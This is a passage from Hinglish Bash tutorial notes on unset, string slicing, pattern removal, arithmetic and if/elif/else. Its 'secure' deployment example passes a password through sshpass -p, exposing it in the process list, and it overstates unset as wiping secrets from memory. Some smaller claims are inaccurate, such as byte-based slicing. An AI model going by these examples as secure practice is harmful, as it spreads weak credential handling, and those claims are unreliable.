unset DB_PASSWORD
unset API_KEY

echo "✓ Script complete"

# cleanup() will run automatically on exit due to trap
```

**Output:**
```
=== Secure Data Processing ===
Enter database password: 
Enter API key: 
Connecting to database...
Calling API...
Processing...
Removing sensitive data from memory...
✓ Script complete
Cleaning up sensitive data...
✓ Cleanup complete
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Empty aur unset confuse:** `var=""` ≠ `unset var`
- ❌ **Passwords unset nahi karna:** Security risk!
- ❌ **Global variables cleanup nahi:** Memory waste

### 10. **Best Practices / Pro Tips**
- 💡 **Passwords hamesha unset:** Security ke liye zaroori
- 💡 **Trap use karo:** Exit par automatic cleanup
- 💡 **Local variables:** Functions mein `local` use karo
- 💡 **Check before use:** `${var:-default}` pattern

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek deployment script bana rahe hain jo credentials safely handle kare:

```bash
#!/bin/bash
# Secure deployment script

# Cleanup function
cleanup() {
    echo "Performing cleanup..."
    unset DEPLOY_PASSWORD
    unset SSH_KEY
    unset DB_PASSWORD
    unset API_SECRET
    
    # Remove temporary files
    rm -f /tmp/deploy_temp_*
    
    echo "✓ Cleanup complete"
}

# Set trap for cleanup
trap cleanup EXIT INT TERM

# Get credentials
echo "=== Deployment Credentials ==="
read -s -p "Deployment password: " DEPLOY_PASSWORD
echo ""
read -s -p "Database password: " DB_PASSWORD
echo ""
read -s -p "API secret: " API_SECRET
echo ""

# Validate credentials
if [ -z "$DEPLOY_PASSWORD" ] || [ -z "$DB_PASSWORD" ]; then
    echo "✗ Missing credentials!"
    exit 1
fi

# Deployment process
echo "Starting deployment..."

# SSH deployment
sshpass -p "$DEPLOY_PASSWORD" ssh user@server << EOF
    cd /var/www/app
    git pull
    
    # Update database password
    sed -i "s/DB_PASS=.*/DB_PASS=$DB_PASSWORD/" .env
    
    # Update API secret
    sed -i "s/API_SECRET=.*/API_SECRET=$API_SECRET/" .env
    
    # Restart services
    systemctl restart app
EOF

echo "✓ Deployment complete"

# Immediate cleanup of sensitive data
unset DEPLOY_PASSWORD
unset DB_PASSWORD
unset API_SECRET

echo "✓ Credentials removed from memory"

# cleanup() will run on exit
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `unset var` - Variable delete
- ✅ `var=""` - Empty (still exists)
- ✅ Passwords hamesha unset karo
- ✅ `trap cleanup EXIT` - Auto cleanup
- ✅ Functions mein `local` use karo

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Empty aur unset mein kya fark hai?**
A: Empty (`var=""`) variable exists but empty. Unset (`unset var`) variable exist hi nahi karta.

**Q2: Kya unset kiye variables wapas aa sakte hain?**
A: Nahi, completely delete ho jaate hain. Dobara set karna padega.

**Q3: Kya environment variables bhi unset ho sakte hain?**
A: Haan, lekin sirf current shell ke liye. Parent shell affected nahi hoga.

### 14. **Practice ke liye Task**

```bash
# 1. Set and unset
name="Satish"
echo "Name: $name"
unset name
echo "Name: $name"

# 2. Empty vs unset
var1="value"
var2="value"

var1=""
unset var2

echo "var1 empty: ${#var1}"
echo "var2 unset: ${#var2}"

# 3. Check if set
test_var="test"
[ -z ${test_var+x} ] && echo "unset" || echo "set"

unset test_var
[ -z ${test_var+x} ] && echo "unset" || echo "set"

# 4. Secure password handling
read -s -p "Password: " pass
echo ""
echo "Password set"
# Use password
unset pass
echo "Password unset"

# 5. Multiple unset
a=1
b=2
c=3
unset a b c
echo "All unset: $a $b $c"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🗑️ `unset` variable ko delete karta hai
- 🔒 Passwords unset karna security practice
- 🧹 Memory cleanup ke liye useful
- 🎯 `trap cleanup EXIT` auto cleanup
- 💡 Empty (`""`) ≠ Unset

> **💡 Ye Zaroor Yaad Rakhein:**
> Sensitive data (passwords, keys) use karne ke baad HAMESHA unset karo! `trap cleanup EXIT` use karke automatic cleanup setup karo. Security first!

---

# **🎉 Module 5 Complete! 🎉**

Congratulations! Aapne **Module 5: Variables & User Input** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **Variables** - `var=value`, `$var`, `${var}` - Data storage
✅ **Quoting** - Single (`'...'`) vs Double (`"..."`) quotes
✅ **Command Substitution** - `$(command)` - Dynamic values
✅ **User Input** - `read`, `read -p`, `read -s` - Interactive scripts
✅ **Unsetting** - `unset` - Cleanup aur security

## **Key Concepts:**
- **Variables:** No spaces around `=`, quotes for spaces
- **Quoting:** Single = literal, Double = expansion
- **Command Sub:** `$(command)` modern, backticks old
- **User Input:** `-p` prompt, `-s` silent, validate always
- **Cleanup:** `unset` sensitive data, `trap` for auto cleanup

## **Real-World Applications:**
```bash
# Configuration
APP_NAME="myapp"
VERSION="1.0.0"
DEPLOY_DIR="/var/www/${APP_NAME}"

# User input
read -p "Environment (dev/prod): " ENV
read -s -p "Password: " PASS

# Command substitution
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="backup_${TIMESTAMP}.tar.gz"

# Cleanup
trap 'unset PASS' EXIT
```

## **Security Best Practices:**
1. **Passwords:** Always `read -s` and `unset` after use
2. **Quoting:** Always `"$var"` to prevent word splitting
3. **Validation:** Never trust user input
4. **Cleanup:** Use `trap` for automatic cleanup

## **Next Steps:**
Ab aap ready hain **Module 6: Advanced Variable Handling** ke liye!

---

**📝 Practice Reminder:**
Variables scripting ka foundation hain! Daily practice karo:
- Different quoting scenarios try karo
- Interactive scripts banao
- Security practices follow karo
- Command substitution master karo

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 6)**

---

## **PART 2: THE CORE OF SCRIPTING**

---

# **Module 6: Advanced Variable Handling**

---

## **Topic 1: String Slicing (Length `${#a}`, Offset `${a:4}`, Length+Offset `${a:4:3}`, From End `${a: -3}`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**String Slicing** - Strings ke parts extract karna bina external commands ke.

### 2. **Ye Kya Hai? (What is it?)**
String slicing Bash ka built-in feature hai jo strings ko manipulate karne deta hai - length nikalna, substrings extract karna, specific positions se characters lena. Yeh `cut`, `awk` se faster hai kyunki built-in hai.

**Analogy:** Socho ki string ek rope hai. Slicing se aap rope ka koi bhi piece kaat sakte hain - shuru se, beech se, end se, ya specific length ka.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Performance** - External commands se fast
- ✅ **String manipulation** - Text processing
- ✅ **Data extraction** - Filenames, paths parse karna
- ✅ **Validation** - Length checks

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Filenames se extensions nikalna
- Paths manipulate karna
- String length validate karna
- Substrings extract karna

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- External commands use karni padegi (slow)
- Complex string operations mushkil
- Performance issues
- Code verbose rahega

### 6. **Syntax aur Common Options**

```bash
# Length
${#variable}

# From position (0-indexed)
${variable:offset}

# From position with length
${variable:offset:length}

# From end (space important!)
${variable: -n}

# From end with length
${variable: -n:length}
```

**Important Patterns:**
- `${#str}` - Length
- `${str:0:5}` - First 5 chars
- `${str:5}` - From position 5 to end
- `${str: -3}` - Last 3 chars
- `${str:2:3}` - 3 chars from position 2

### 7. **Example 1 (Basic)**

```bash
# String length
$ name="Satish Kumar"
$ echo ${#name}
12

# First 6 characters
$ echo ${name:0:6}
Satish

# From position 7 to end
$ echo ${name:7}
Kumar

# Last 5 characters (space before -)
$ echo ${name: -5}
Kumar

# 3 characters from position 2
$ echo ${name:2:3}
tis
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File processor with string slicing

process_file() {
    local filepath=$1
    local filename=$(basename "$filepath")
    
    # Get file extension
    local ext="${filename##*.}"
    
    # Get filename without extension
    local name="${filename%.*}"
    
    # Get first 10 chars of name
    local short_name="${name:0:10}"
    
    # Get file size
    local size=$(stat -f%z "$filepath" 2>/dev/null || stat -c%s "$filepath")
    
    echo "File: $filename"
    echo "  Name: $name"
    echo "  Extension: $ext"
    echo "  Short name: $short_name"
    echo "  Size: $size bytes"
    
    # Validate filename length
    if [ ${#filename} -gt 255 ]; then
        echo "  ⚠️  Filename too long!"
    fi
    
    # Check extension
    case "$ext" in
        txt|log)
            echo "  Type: Text file"
            ;;
        jpg|png|gif)
            echo "  Type: Image file"
            ;;
        sh|bash)
            echo "  Type: Script file"
            ;;
        *)
            echo "  Type: Unknown"
            ;;
    esac
}

# Date string manipulation
DATE_STRING="2024-01-15"
YEAR="${DATE_STRING:0:4}"
MONTH="${DATE_STRING:5:2}"
DAY="${DATE_STRING:8:2}"

echo "Date: $DATE_STRING"
echo "Year: $YEAR"
echo "Month: $MONTH"
echo "Day: $DAY"

# Process files
for file in *.txt; do
    [ -f "$file" ] && process_file "$file"
done
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **Negative index mein space bhoolna:** `${var:-3}` galat, `${var: -3}` sahi
- ❌ **1-based indexing assume karna:** Bash 0-based hai
- ❌ **Length mein colon:** `${#var:0}` galat, `${#var}` sahi

### 10. **Best Practices / Pro Tips**
- 💡 **Quotes use karo:** `"${var:0:5}"` safe
- 💡 **Validation:** Length check karo slicing se pehle
- 💡 **Negative index:** Space zaroori hai `${var: -n}`
- 💡 **Performance:** Built-in slicing > external commands

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek log analyzer bana rahe hain:

```bash
#!/bin/bash
# Log analyzer with string slicing

LOG_FILE="/var/log/app.log"

while IFS= read -r line; do
    # Extract timestamp (first 19 chars: YYYY-MM-DD HH:MM:SS)
    timestamp="${line:0:19}"
    
    # Extract log level (chars 20-25)
    level="${line:20:5}"
    level="${level// /}"  # Remove spaces
    
    # Extract message (from char 26 onwards)
    message="${line:26}"
    
    # Parse timestamp
    date="${timestamp:0:10}"
    time="${timestamp:11:8}"
    hour="${time:0:2}"
    
    # Count by hour
    case "$level" in
        ERROR)
            echo "[$date $hour:00] ERROR: ${message:0:50}..."
            ;;
        WARN)
            echo "[$date $hour:00] WARN: ${message:0:50}..."
            ;;
    esac
    
done < "$LOG_FILE"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `${#var}` - Length
- ✅ `${var:n}` - From position n
- ✅ `${var:n:m}` - m chars from position n
- ✅ `${var: -n}` - Last n chars (space!)
- ✅ 0-indexed, built-in, fast

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Kya negative offset use kar sakte hain?**
A: Haan, lekin space zaroori hai: `${var: -5}` (space before -)

**Q2: Out of bounds kya hota hai?**
A: Empty string return hoti hai, error nahi.

**Q3: Unicode characters ke saath kaam karta hai?**
A: Haan, lekin byte-based hai, character-based nahi.

### 14. **Practice ke liye Task**

```bash
# 1. Length
text="Hello World"
echo "Length: ${#text}"

# 2. First 5 chars
echo "First 5: ${text:0:5}"

# 3. From position 6
echo "From 6: ${text:6}"

# 4. Last 5 chars
echo "Last 5: ${text: -5}"

# 5. Middle extraction
echo "Middle: ${text:3:5}"

# 6. Date parsing
date="2024-01-15"
echo "Year: ${date:0:4}"
echo "Month: ${date:5:2}"
echo "Day: ${date:8:2}"

# 7. Filename processing
file="document.txt"
echo "Extension: ${file: -3}"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 📏 `${#var}` string length nikalta hai
- ✂️ `${var:n:m}` substring extract karta hai
- 🔚 `${var: -n}` end se extract (space important!)
- ⚡ Built-in hai, external commands se fast
- 🎯 0-indexed hai, validation zaroori

> **💡 Ye Zaroor Yaad Rakhein:**
> String slicing Bash ka powerful built-in feature hai! Negative index ke liye space zaroori: `${var: -3}`. External commands se fast hai!

---

## **Topic 2: Pattern Removal (From Start `#` & `##`, From End `%` & `%%`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Pattern Removal** - Strings se patterns remove karna efficiently.

### 2. **Ye Kya Hai? (What is it?)**
Pattern removal Bash operators hain jo strings se matching patterns delete karte hain. `#` aur `##` start se remove karte hain (shortest/longest match), `%` aur `%%` end se remove karte hain.

**Analogy:** Socho ki string ek pencil hai. `#` eraser hai jo shuru se thoda erase karta hai, `##` poora shuru erase kar deta hai. `%` end se thoda, `%%` poora end erase karta hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **File extensions remove** - `filename.txt` → `filename`
- ✅ **Path manipulation** - `/path/to/file` → `file`
- ✅ **String cleanup** - Prefixes/suffixes remove
- ✅ **Performance** - Built-in, fast

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File extensions nikalna
- Paths se filenames extract karna
- Prefixes/suffixes remove karna
- URL parsing

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- `sed`, `awk` use karni padegi (slow)
- Complex string operations
- Code verbose
- Performance issues

### 6. **Syntax aur Common Options**

```bash
# Remove from start (shortest match)
${variable#pattern}

# Remove from start (longest match)
${variable##pattern}

# Remove from end (shortest match)
${variable%pattern}

# Remove from end (longest match)
${variable%%pattern}
```

**Mnemonic:**
- `#` = start (keyboard par left side)
- `%` = end (keyboard par right side)
- Single = shortest match
- Double = longest match

### 7. **Example 1 (Basic)**

```bash
# File extension removal
$ filename="document.txt"
$ echo ${filename%.*}
document

# Path to filename
$ path="/home/user/file.txt"
$ echo ${path##*/}
file.txt

# Remove prefix
$ url="https://example.com/page"
$ echo ${url#https://}
example.com/page

# Remove suffix
$ file="backup.tar.gz"
$ echo ${file%.*}
backup.tar
$ echo ${file%%.*}
backup
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# File organizer with pattern removal

organize_files() {
    local source_dir=$1
    local dest_dir=$2
    
    for file in "$source_dir"/*; do
        [ -f "$file" ] || continue
        
        # Get filename
        filename="${file##*/}"
        
        # Get extension (remove everything before last dot)
        ext="${filename##*.}"
        
        # Get name without extension
        name="${filename%.*}"
        
        # Create category directory
        mkdir -p "$dest_dir/$ext"
        
        # Move file
        mv "$file" "$dest_dir/$ext/"
        echo "Moved: $filename → $ext/"
    done
}

# URL parser
parse_url() {
    local url=$1
    
    # Remove protocol
    local no_protocol="${url#*://}"
    
    # Extract domain (remove path)
    local domain="${no_protocol%%/*}"
    
    # Extract path (remove domain)
    local path="${no_protocol#*/}"
    
    echo "URL: $url"
    echo "Domain: $domain"
    echo "Path: /$path"
}

# Backup file naming
create_backup() {
    local file=$1
    local name="${file%.*}"
    local ext="${file##*.}"
    local timestamp=$(date +%Y%m%d_%H%M%S)
    
    local backup_name="${name}_backup_${timestamp}.${ext}"
    
    cp "$file" "$backup_name"
    echo "Backup created: $backup_name"
}

# Examples
parse_url "https://example.com/path/to/page.html"
create_backup "config.conf"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`#` aur `%` confuse:** `#` start se, `%` end se
- ❌ **Single aur double confuse:** Single shortest, double longest
- ❌ **Wildcards galat:** `*` use karo patterns mein

### 10. **Best Practices / Pro Tips**
- 💡 **Mnemonic yaad rakho:** `#` left (start), `%` right (end)
- 💡 **Double for greedy:** `##` aur `%%` longest match
- 💡 **Wildcards:** `*` patterns mein powerful
- 💡 **basename alternative:** `${path##*/}` faster

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek deployment script bana rahe hain:

```bash
#!/bin/bash
# Deployment script with pattern removal

REPO_URL="https://github.com/user/project.git"
DEPLOY_DIR="/var/www"

# Extract project name from URL
PROJECT_NAME="${REPO_URL##*/}"
PROJECT_NAME="${PROJECT_NAME%.git}"

echo "Deploying: $PROJECT_NAME"

# Clone repository
cd "$DEPLOY_DIR"
git clone "$REPO_URL"

# Process configuration files
cd "$PROJECT_NAME"

for config in *.example; do
    # Remove .example suffix
    actual_config="${config%.example}"
    
    if [ ! -f "$actual_config" ]; then
        cp "$config" "$actual_config"
        echo "Created: $actual_config"
    fi
done

# Process log files
for log in logs/*.log; do
    [ -f "$log" ] || continue
    
    # Get filename without path
    filename="${log##*/}"
    
    # Get date from filename (format: app_YYYYMMDD.log)
    date_part="${filename#*_}"
    date_part="${date_part%.log}"
    
    # Archive old logs (older than 7 days)
    if [ "$date_part" -lt "$(date -d '7 days ago' +%Y%m%d)" ]; then
        gzip "$log"
        echo "Archived: $filename"
    fi
done

echo "Deployment complete!"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `${var#pattern}` - Start se shortest remove
- ✅ `${var##pattern}` - Start se longest remove
- ✅ `${var%pattern}` - End se shortest remove
- ✅ `${var%%pattern}` - End se longest remove
- ✅ `#` = start, `%` = end

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Single aur double mein kya fark hai?**
A: Single shortest match, double longest match. Example: `file.tar.gz` → `%.*` = `file.tar`, `%%.*` = `file`

**Q2: Kya regex use kar sakte hain?**
A: Nahi, sirf shell wildcards (`*`, `?`, `[...]`)

**Q3: Case-sensitive hai?**
A: Haan, case matters. Case-insensitive ke liye `shopt -s nocasematch`

### 14. **Practice ke liye Task**

```bash
# 1. Extension removal
file="document.txt"
echo ${file%.*}

# 2. Path to filename
path="/home/user/file.txt"
echo ${path##*/}

# 3. Remove protocol
url="https://example.com"
echo ${url#*://}

# 4. Multiple extensions
archive="file.tar.gz"
echo "Shortest: ${archive%.*}"
echo "Longest: ${archive%%.*}"

# 5. Prefix removal
text="prefix_data_suffix"
echo ${text#prefix_}

# 6. Suffix removal
echo ${text%_suffix}

# 7. Complex pattern
path="/var/log/app/error.log"
echo "Filename: ${path##*/}"
echo "Directory: ${path%/*}"
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔪 `#` start se remove, `%` end se remove
- 📏 Single shortest, double longest match
- 📁 File extensions: `${file%.*}`
- 🌐 Filenames: `${path##*/}`
- ⚡ Built-in, fast, no external commands

> **💡 Ye Zaroor Yaad Rakhein:**
> Pattern removal ka mnemonic: `#` keyboard par left (start), `%` right (end). Single shortest, double longest. File operations mein bahut useful!

---

## **Topic 3: Arithmetic Operations (`let` command, `((...))` syntax)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**Arithmetic Operations** - Bash mein mathematical calculations karna.

### 2. **Ye Kya Hai? (What is it?)**
Bash mein numbers ke saath calculations karne ke liye do main methods hain: `let` command (purana) aur `((...))` syntax (modern, recommended). Yeh integer arithmetic support karte hain.

**Analogy:** Socho ki Bash ek calculator hai. `let` ek purana calculator hai, `((...))` ek modern scientific calculator. Dono kaam karte hain, lekin modern zyada convenient hai.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Calculations** - Counters, loops, math
- ✅ **Comparisons** - Numeric comparisons
- ✅ **Automation** - Dynamic calculations
- ✅ **Performance** - Built-in, fast

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- Loop counters
- File size calculations
- Percentage calculations
- Numeric validations

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- `bc`, `awk` use karni padegi (slow)
- Integer calculations mushkil
- Code verbose
- Performance issues

### 6. **Syntax aur Common Options**

```bash
# Modern syntax (RECOMMENDED)
((variable = expression))
((variable++))
((variable += 5))
result=$((expression))

# Old syntax (avoid)
let "variable = expression"
let variable++

# Operators
+ - * / %           # Basic math
** (power)
++ -- (increment/decrement)
+= -= *= /= %=      # Compound assignment
```

**Important:**
- Integer only (no decimals)
- No `$` needed inside `(())`
- Use `bc` for floating point

### 7. **Example 1 (Basic)**

```bash
# Basic arithmetic
$ a=10
$ b=5
$ ((sum = a + b))
$ echo $sum
15

# Increment
$ count=0
$ ((count++))
$ echo $count
1

# Compound assignment
$ total=100
$ ((total += 50))
$ echo $total
150

# Expression result
$ result=$((10 * 5 + 3))
$ echo $result
53

# Power
$ power=$((2 ** 8))
$ echo $power
256
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System monitor with calculations

# Disk usage percentage
DISK_TOTAL=$(df / | awk 'NR==2 {print $2}')
DISK_USED=$(df / | awk 'NR==2 {print $3}')
((DISK_PERCENT = DISK_USED * 100 / DISK_TOTAL))

echo "Disk Usage: ${DISK_PERCENT}%"

if ((DISK_PERCENT > 90)); then
    echo "⚠️  Disk almost full!"
elif ((DISK_PERCENT > 75)); then
    echo "⚠️  Disk usage high"
else
    echo "✓ Disk usage normal"
fi

# File counter with progress
TOTAL_FILES=$(find /data -type f | wc -l)
PROCESSED=0

find /data -type f | while read file; do
    # Process file
    ((PROCESSED++))
    
    # Calculate percentage
    ((PERCENT = PROCESSED * 100 / TOTAL_FILES))
    
    # Progress bar
    printf "\rProcessing: %d/%d (%d%%)" $PROCESSED $TOTAL_FILES $PERCENT
done

echo ""

# Backup size calculator
calculate_backup_size() {
    local dir=$1
    local size_kb=$(du -sk "$dir" | cut -f1)
    
    # Convert to MB
    ((size_mb = size_kb / 1024))
    
    # Estimate compressed size (assume 30% compression)
    ((compressed_mb = size_mb * 70 / 100))
    
    echo "Original: ${size_mb}MB"
    echo "Compressed (estimated): ${compressed_mb}MB"
}

# Loop with arithmetic
echo "Countdown:"
for ((i=10; i>=1; i--)); do
    echo -n "$i "
    sleep 1
done
echo "Done!"

# Factorial calculator
factorial() {
    local n=$1
    local result=1
    
    for ((i=1; i<=n; i++)); do
        ((result *= i))
    done
    
    echo $result
}

echo "Factorial of 5: $(factorial 5)"
```

### 9. **Beginners ki Aam Galtiyan (Common Mistakes)**
- ❌ **`$` inside `(())`:** `((a = $b + $c))` galat, `((a = b + c))` sahi
- ❌ **Floating point expect:** Bash sirf integers, decimals ke liye `bc`
- ❌ **Spaces in `let`:** `let a = 5` galat, `let a=5` sahi

### 10. **Best Practices / Pro Tips**
- 💡 **`(())` prefer karo:** Modern aur readable
- 💡 **No `$` inside:** Variables directly use karo
- 💡 **Floating point:** `bc` ya `awk` use karo
- 💡 **C-style loops:** `for ((i=0; i<10; i++))`

### 11. **Asli Duniya ka Scenario (Real-World Scenario)**

Aap ek backup rotation script bana rahe hain:

```bash
#!/bin/bash
# Backup rotation with calculations

BACKUP_DIR="/backups"
MAX_BACKUPS=7
MAX_SIZE_GB=100

# Count existing backups
BACKUP_COUNT=$(ls -1 "$BACKUP_DIR"/backup_*.tar.gz 2>/dev/null | wc -l)

echo "Current backups: $BACKUP_COUNT"

# Calculate total size
TOTAL_SIZE_KB=$(du -sk "$BACKUP_DIR" | cut -f1)
((TOTAL_SIZE_MB = TOTAL_SIZE_KB / 1024))
((TOTAL_SIZE_GB = TOTAL_SIZE_MB / 1024))

echo "Total size: ${TOTAL_SIZE_GB}GB"

# Check if cleanup needed
if ((BACKUP_COUNT >= MAX_BACKUPS)) || ((TOTAL_SIZE_GB >= MAX_SIZE_GB)); then
    echo "Cleanup required!"
    
    # Calculate how many to delete
    ((TO_DELETE = BACKUP_COUNT - MAX_BACKUPS + 1))
    
    if ((TO_DELETE < 0)); then
        TO_DELETE=0
    fi
    
    echo "Deleting $TO_DELETE old backups..."
    
    # Delete oldest backups
    ls -t "$BACKUP_DIR"/backup_*.tar.gz | tail -n "$TO_DELETE" | xargs rm -v
    
    # Recalculate
    BACKUP_COUNT=$(ls -1 "$BACKUP_DIR"/backup_*.tar.gz 2>/dev/null | wc -l)
    TOTAL_SIZE_KB=$(du -sk "$BACKUP_DIR" | cut -f1)
    ((TOTAL_SIZE_GB = TOTAL_SIZE_KB / 1024 / 1024))
    
    echo "After cleanup:"
    echo "  Backups: $BACKUP_COUNT"
    echo "  Size: ${TOTAL_SIZE_GB}GB"
fi

# Create new backup
echo "Creating new backup..."
NEW_BACKUP="$BACKUP_DIR/backup_$(date +%Y%m%d_%H%M%S).tar.gz"

START_TIME=$(date +%s)
tar -czf "$NEW_BACKUP" /data
END_TIME=$(date +%s)

# Calculate duration
((DURATION = END_TIME - START_TIME))
((MINUTES = DURATION / 60))
((SECONDS = DURATION % 60))

echo "Backup complete!"
echo "Duration: ${MINUTES}m ${SECONDS}s"

# Calculate backup size
BACKUP_SIZE_KB=$(du -k "$NEW_BACKUP" | cut -f1)
((BACKUP_SIZE_MB = BACKUP_SIZE_KB / 1024))

echo "Size: ${BACKUP_SIZE_MB}MB"
```

### 12. **Checklist / Chota Recap (TL;DR)**
- ✅ `((...))` modern syntax (recommended)
- ✅ `let` old syntax (avoid)
- ✅ No `$` inside `(())`
- ✅ Integer only, no decimals
- ✅ C-style operators: `++`, `+=`, etc.

### 13. **Aksar Puche Jaane Wale Sawaal (FAQs)**

**Q1: Floating point kaise karu?**
A: `bc` use karo: `result=$(echo "scale=2; 10/3" | bc)`

**Q2: `let` aur `(())` mein kya fark hai?**
A: Functionally same, lekin `(())` modern, readable, aur flexible hai.

**Q3: Division mein remainder kaise nikalu?**
A: Modulo operator: `remainder=$((10 % 3))` → 1

### 14. **Practice ke liye Task**

```bash
# 1. Basic math
a=10
b=5
((sum = a + b))
((diff = a - b))
((prod = a * b))
((quot = a / b))
echo "Sum: $sum, Diff: $diff, Prod: $prod, Quot: $quot"

# 2. Increment/Decrement
count=0
((count++))
echo "After ++: $count"
((count--))
echo "After --: $count"

# 3. Compound assignment
total=100
((total += 50))
((total -= 20))
((total *= 2))
echo "Total: $total"

# 4. Power
result=$((2 ** 10))
echo "2^10 = $result"

# 5. Percentage
part=25
whole=100
((percent = part * 100 / whole))
echo "Percentage: $percent%"

# 6. C-style loop
for ((i=1; i<=5; i++)); do
    echo "Iteration: $i"
done

# 7. Comparison
num=50
if ((num > 40 && num < 60)); then
    echo "In range"
fi
```

### 15. **Aakhri Choti Summary (5 lines)**
- 🔢 `((...))` modern arithmetic syntax
- ➕ Basic operators: `+ - * / %`
- 🔼 Increment: `++`, Compound: `+=`
- 🚫 Integer only, no decimals
- 💡 No `$` needed inside `(())`

> **💡 Ye Zaroor Yaad Rakhein:**
> `((...))` use karo arithmetic ke liye! No `$` inside, integer only. Floating point ke liye `bc` use karo. C-style syntax supported hai!

---

# **🎉 Module 6 Complete! 🎉**

Congratulations! Aapne **Module 6: Advanced Variable Handling** successfully complete kar liya hai!

## **Aapne Kya Seekha:**
✅ **String Slicing** - `${#var}`, `${var:n:m}`, `${var: -n}`
✅ **Pattern Removal** - `#`, `##`, `%`, `%%`
✅ **Arithmetic** - `((...))`, `let`, calculations

## **Key Patterns:**
```bash
# String operations
${#var}              # Length
${var:0:5}           # First 5 chars
${var: -3}           # Last 3 chars
${var#prefix}        # Remove prefix
${var%suffix}        # Remove suffix
${var##*/}           # Filename from path
${var%.*}            # Remove extension

# Arithmetic
((count++))          # Increment
((total += 10))      # Add
result=$((a * b))    # Calculate
```

## **Real-World Use Cases:**
- File processing: extensions, paths
- String manipulation: parsing, cleanup
- Calculations: percentages, sizes
- Loop counters and conditions

## **Next Steps:**
Ab aap ready hain **Module 7: Scripting Logic & Control Flow** ke liye!

---

=============================================================

# **Bash Shell Scripting: Zero-to-Automation Notes (Module 7)**

---

## **PART 2: THE CORE OF SCRIPTING**

---

# **Module 7: Scripting Logic & Control Flow**

---

## **Topic 1: `if`, `elif`, `else` Syntax (`if [ ... ]; then ... fi`)**

### 1. **Topic ka Naam / Ek Line Mein Summary** 🚀
**if-elif-else** - Decisions lena aur conditional logic implement karna.

### 2. **Ye Kya Hai? (What is it?)**
`if` statement scripts ko decisions lene ki power deta hai - agar condition true hai toh yeh karo, warna woh karo. `elif` multiple conditions ke liye, `else` default action ke liye.

**Analogy:** Socho ki traffic signal hai. Red (if false) = stop, Green (if true) = go, Yellow (elif) = slow down. Script bhi aise hi decisions leta hai conditions ke basis par.

### 3. **Kyun Zaroori Hai? (Why is it important?)**
- ✅ **Decision making** - Dynamic behavior
- ✅ **Error handling** - Failures handle karna
- ✅ **Validation** - Input/data check karna
- ✅ **Automation** - Smart scripts banana

### 4. **Ise Kab Use Karna Chahiye? (When to use it?)**
- File existence check
- User input validation
- Error handling
- Conditional execution

### 5. **Agar Ye Pata Nahi Hoga Toh Kya Hoga? (Risk?)** 😟
- Scripts linear rahenge (no decisions)
- Error handling impossible
- Validation nahi kar paoge
- Smart automation nahi bana paoge

### 6. **Syntax aur Common Options**

```bash
# Basic if
if [ condition ]; then
    commands
fi

# if-else
if [ condition ]; then
    commands
else
    commands
fi

# if-elif-else
if [ condition1 ]; then
    commands
elif [ condition2 ]; then
    commands
else
    commands
fi

# One-liner
if [ condition ]; then command; fi
```

### 7. **Example 1 (Basic)**

```bash
# File check
if [ -f "file.txt" ]; then
    echo "File exists"
fi

# Number comparison
age=25
if [ $age -ge 18 ]; then
    echo "Adult"
else
    echo "Minor"
fi

# Multiple conditions
score=85
if [ $score -ge 90 ]; then
    echo "Grade: A"
elif [ $score -ge 80 ]; then
    echo "Grade: B"
elif [ $score -ge 70 ]; then
    echo "Grade: C"
else
    echo "Grade: F"
fi
```

### 8. **Example 2 (Advanced/Script)**

```bash
#!/bin/bash
# System health checker

check_disk() {
    local usage=$(df / | awk 'NR==2 {print $5}' | sed 's/%//')
    
    if [ $usage -gt 90 ]; then
        echo "⚠️  CRITICAL: Disk usage ${usage}%"
        return 2
    elif [ $usage -gt 75 ]; then
        echo "⚠️  WARNING: Disk usage ${usage}%"
        return 1
    else
        echo "✓ Disk usage OK: ${usage}%"
        return 0
    fi
}

check_service() {
    local service=$1
    
    if systemctl is-active --quiet "$service"; then
        echo "✓ $service is running"
        return 0
    else
        echo "✗ $service is not running"
        
        if systemctl is-enabled --quiet "$service"; then
            echo "  Attempting to start..."
            if systemctl start "$service"; then
                echo "  ✓ Started successfully"
                return 0
            else
                echo "  ✗ Failed to start"
                return 1
            fi
        else
            echo "  Service is disabled"
            return 1
        fi
    fi
}

# Main checks
echo "=== System Health Check ==="

check_disk
DISK_STATUS=$?

check_service "apache2"
APACHE_STATUS=$?

check_service "mysql"
MYSQL_STATUS=$?

# Overall status
